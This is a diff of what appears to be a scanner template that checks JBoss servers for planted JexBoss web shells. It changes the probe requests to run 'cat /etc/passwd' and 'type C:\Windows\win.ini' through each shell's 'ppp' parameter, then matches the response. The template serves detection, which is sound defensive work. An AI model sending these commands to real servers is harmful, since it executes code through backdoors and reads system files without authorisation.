@@ -12,10 +12,14 @@ brief:
 moves:
     - verb: GET
       to:
-        - '{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode(''{{command}}'')}}'
-        - '{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode(''{{command}}'')}}'
-        - '{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode(''{{command}}'')}}'
-        - '{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode(''{{command}}'')}}'
+        - '{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode(''cat /etc/passwd'')}}'
+        - '{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode(''cat /etc/passwd'')}}'
+        - '{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode(''cat /etc/passwd'')}}'
+        - '{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode(''cat /etc/passwd'')}}'
+        - '{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode(''type C:\/Windows\/win.ini'')}}'
+        - '{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode(''type C:\/Windows\/win.ini'')}}'
+        - '{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode(''type C:\/Windows\/win.ini'')}}'
+        - '{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode(''type C:\/Windows\/win.ini'')}}'
       signs:
         - "on": word
           has:
